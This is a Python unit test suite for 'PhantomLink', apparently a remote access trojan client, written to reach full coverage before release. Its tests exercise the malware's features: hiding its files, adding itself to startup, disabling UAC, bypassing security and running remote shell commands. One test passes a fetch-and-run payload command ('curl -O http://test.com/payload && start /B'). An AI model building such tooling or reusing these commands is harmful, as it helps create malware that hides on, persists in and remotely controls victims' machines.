import io
import os
import sys
import unittest
import socket
import subprocess
from pathlib import Path
from unittest.mock import MagicMock, patch

_REPO_ROOT = Path(__file__).resolve().parents[1]
if str(_REPO_ROOT) not in sys.path:
    sys.path.insert(0, str(_REPO_ROOT))

_CLIENT_DIR = _REPO_ROOT / "client"
if str(_CLIENT_DIR) not in sys.path:
    sys.path.insert(0, str(_CLIENT_DIR))

import client.PhantomLink as pl


class PhantomLinkDeepCoverageComprehensiveTests(unittest.TestCase):
    """Full production-ready coverage test suite targeting missing lines in client/PhantomLink.py."""

    def test_move_to_hidden_location_admin_and_non_admin(self):
        with patch("ctypes.windll.shell32.IsUserAnAdmin", return_value=False):
            self.assertTrue(pl.move_to_hidden_location())

        with patch("ctypes.windll.shell32.IsUserAnAdmin", return_value=True), \
             patch("os.path.samefile", return_value=True), \
             patch("client.PhantomLink.add_to_startup"):
            self.assertTrue(pl.move_to_hidden_location())

    def test_execute_command_all_branches(self):
        sc = pl.ShellClient()

        # cd success and failure
        with patch("os.chdir"):
            res = sc.execute_command(r"cd C:\Users")
            self.assertIn("Changed directory", res)

        with patch("os.chdir", side_effect=OSError("Access denied")):
            res = sc.execute_command(r"cd C:\System")
            self.assertIn("Failed to change directory", res)

        # pwd
        self.assertEqual(sc.execute_command("pwd"), os.getcwd())

        # background command launch
        with patch("subprocess.Popen") as mock_popen:
            res = sc.execute_command("curl -O http://test.com/payload && start /B")
            self.assertIn("background", res)

        # subprocess.run success with stderr and timeout
        with patch("subprocess.run") as mock_run:
            mock_run.return_value = MagicMock(stdout="Output text\n", stderr="Warning text", returncode=1)
            res = sc.execute_command("dir")
            self.assertIn("Output text", res)
            self.assertIn("[STDERR]: Warning text", res)
            self.assertIn("[Exit Code]: 1", res)

            mock_run.side_effect = subprocess.TimeoutExpired("cmd", 300)
            res = sc.execute_command("sleep 500")
            self.assertIn("timed out", res)

    def test_main_startup_sequence(self):
        with patch("ctypes.windll.shell32.IsUserAnAdmin", return_value=False), \
             patch("client.PhantomLink.disable_uac"), \
             patch("client.PhantomLink.update"), \
             patch("client.PhantomLink.bypass_security"), \
             patch("client.PhantomLink.move_to_hidden_location"), \
             patch("client.PhantomLink.bypass_all_security"), \
             patch("client.PhantomLink.ShellClient") as mock_client_cls:
            
            mock_client_inst = MagicMock()
            mock_client_cls.return_value = mock_client_inst
            mock_client_inst.run.side_effect = Exception("Stop main loop test")

            with patch("os.path.exists", return_value=True):
                pl.main()
                self.assertTrue(mock_client_inst.run.called)


if __name__ == "__main__":
    unittest.main()
